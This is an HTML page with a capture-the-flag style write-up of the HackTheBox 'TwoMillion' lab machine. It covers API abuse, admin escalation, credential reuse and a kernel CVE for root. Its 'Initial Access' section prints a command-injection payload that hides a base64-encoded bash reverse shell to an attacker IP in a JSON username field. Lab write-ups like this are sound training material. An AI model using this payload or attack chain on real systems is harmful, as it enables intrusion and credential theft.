<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Black-box Penetration Test</title>
  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
</head>
<body>
  <div id="toc-container"></div>

  <header>
    <h1>Black-box Penetration Test : TwoMillion</h1>
  </header>

   <section>
     <p>TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox.</p>
     <p>The box features an old version of the HackTheBox platform that includes the old hackable invite code.</p>
     <p>After hacking the invite code an account can be created on the platform.</p>
     <p>The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator.</p>
     <p>With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell.</p>
     <p>An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box.</p>
     <p>The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</p>
   </section>

   <section>
    <h2>VPN</h2>
       <p>Connect to vpn using openvpn</p>
   </section>
  
   <section>
    <h2>Scan</h2>
       <p>Scan IP with nmap</p>
       <p>found ports open : 22, 80 and domain name</p>
   </section>

   <section>
    <h2>DNS</h2>
       <p>add domain into /etc/hosts file</p>
   </section>

   <section>
    <h2>JS - Endpoint Discovery via Information Disclosure</h2>
       <p>Information Disclosure : Check Source Code, open inviteapi.min.js file</p>
       <p>Endpoint Discovery : Deobfuscate js code using https://lelinhtinh.github.io/de4js/, we found an Endpoint that explains how to authenticate</p>
   </section>

   <section>
    <h2>API - Authentication via Forged Crendentials via Broken Access Control</h2>
       <p>Broken Access Control : send a POST request to generate an invitation to authenticate then base64decode token</p>
       <p>Forged Credentials : send token as proof of invitation</p>
       <p>Authentication : authenticate after Signing up with any email</p>
   </section>

   <section>
    <h2>Admin - Escalate Privileges via Broken Access Control</h2>
       <p>Broken Access Control : send a PUT request to update profile with parameter is_admin set to 1</p>
       <p>Escalate Privileges to admin</p>
   </section>

   <section>
    <h2>WWW - Initial Access via Command Injection</h2>
       <p>Command Injection : API endpoint to generate vpn, pass command in username parameter {"username":"myUser;id;"}</p>
       <p>Initial Access : listen on port 1234, inject reverse shell (base64encoded) {"username":"myUser;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41MC8xMjM0IDA+JjE= | base64 -d | bash;"}</p>
   </section>
  
   <section>
    <h2>User - SSH Takeover via Credentials Theft</h2>
       <p>Credentials Theft / Information Disclosure : read .env file to find DB username:password</p>
       <p>SSH Takeover : connect to user@server using the DB password that is reused</p>
   </section>

   <section>
    <h2>Root - Escalate Privileges via Vulnerability Research via Information Disclosure</h2>
       <p>Information Disclosure : The OverlayFS / FUSE kernel exploit, is mentioned in the mail</p>
       <p>Vulnerability Research : ExploitDB CVE-2023–0386</p>
       <p>Escalate Privileges : clone git repository, copy it to server, run exploit</p>
       <p>ROOT</p>
   </section>

  <footer>
    <p>When your system talks too much, attackers listen even harder : be wary of Information Disclosure</p>
    <p>Here's what Broken Access Control is : If anyone can open the door, don’t be surprised when someone walks in.</p>
  </footer>
  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
</body>
</html>
